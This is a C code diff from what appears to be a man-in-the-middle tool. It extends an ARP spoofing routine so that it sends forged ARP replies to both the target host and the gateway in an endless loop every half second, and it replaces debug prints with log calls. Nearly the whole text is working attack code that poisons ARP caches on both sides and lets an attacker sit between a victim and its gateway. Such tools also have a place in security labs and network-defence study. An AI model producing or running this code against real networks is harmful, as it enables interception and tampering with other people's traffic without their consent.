@@ -46,23 +46,25 @@ int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_c
 }
 void* arp_spoof(void* info){
 	MITM_info* m_info=(MITM_info*)info;
-	if(debug){
-		printf("=======start arp spoof=======\n");
-		printf("target's IP is ");
-		println_ip(m_info->TARGET_IP);	
-	}
+	log_printf(MSG_INFO,"start arp spoof to both gateway and target");
 	int p_tag_target;
+	int p_tag_gateway;
 	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
 				m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
-	if(p_tag_target == -1){
-		if(debug) printf("=======arp spoof fail,return=======\n");
+	p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
+				m_info->GATEWAY_MAC,m_info->TARGET_IP,m_info->GATEWAY_IP,0);
+	if(p_tag_target == -1 || p_tag_gateway == -1){
+		log_printf(MSG_WARNING,"arp spoof fail");
 		return NULL;
 	}
 	while(1){
 		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
 				m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
-		if(p_tag_target == -1)break;
+		p_tag_gateway=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->GATEWAY_MAC,
+				m_info->TARGET_IP,m_info->GATEWAY_IP,p_tag_gateway);
+		if(p_tag_target == -1 || p_tag_gateway == -1)break;
+		usleep(500000);
 	}
-	printf("=======arp spoof fail,return=======\n");
+	log_printf(MSG_WARNING,"arp spoof fail,return");
 	return NULL;
 }
